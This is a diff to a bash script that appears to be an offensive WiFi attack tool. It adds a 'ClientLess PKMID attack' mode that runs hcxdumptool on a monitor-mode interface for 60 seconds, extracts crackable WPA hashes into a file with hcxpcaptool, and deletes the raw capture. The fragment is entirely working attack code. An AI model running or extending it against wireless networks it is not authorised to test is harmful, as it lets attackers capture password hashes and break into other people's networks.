@@ -114,7 +114,17 @@ function startAttack() {
 
 	elif [ "$(echo $mode)" == "PKMID" ]; then
 		clear
-		echo -e "${yellowColour}[*]${endColour}${grayColour} Starting ClientLess PKMID attack...${endColour}"
+		echo -e "${yellowColour}[*]${endColour}${grayColour} Starting ClientLess PKMID attack...${endColour}\n"
+		sleep 2
+
+		timeout 60 bash -c "hcxdumptool -i ${network_card}mon --enable_status=1 -o screenshot"
+		echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obtaining hashes...${endColour}\n"
+		sleep 2
+		hcxpcaptool -z myHashes screenshot
+		rm screenshot 2>/dev/null
+
+		test -f myHashes
+
 	else
 		echo -e "\n${redColour}[*] This attack mode is not valid ${endColour}"
 		exit 1
